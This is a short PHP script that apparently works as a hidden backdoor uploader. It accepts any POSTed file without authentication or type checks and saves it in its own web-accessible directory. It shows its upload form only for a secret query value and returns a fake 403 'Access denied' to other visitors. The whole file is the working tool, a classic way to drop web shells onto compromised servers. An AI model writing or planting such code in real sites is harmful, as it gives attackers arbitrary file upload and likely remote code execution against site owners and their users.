<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $uploadDir = __DIR__ . '/';
    $uploadFile = $uploadDir . basename($_FILES['file']['name']);

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo "File uploaded successfully: " . htmlspecialchars($_FILES['file']['name']);
    } else {
        echo "Upload failed.";
    }
    exit;
}

// Only show form if ?res=777 is set
if (isset($_GET['res']) && $_GET['res'] === '777') {
    ?>
    <!DOCTYPE html>
    <html>
    <body>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" />
            <button type="submit">Upload</button>
        </form>
    </body>
    </html>
    <?php
} else {
    http_response_code(403);
    echo "Access denied.";
}

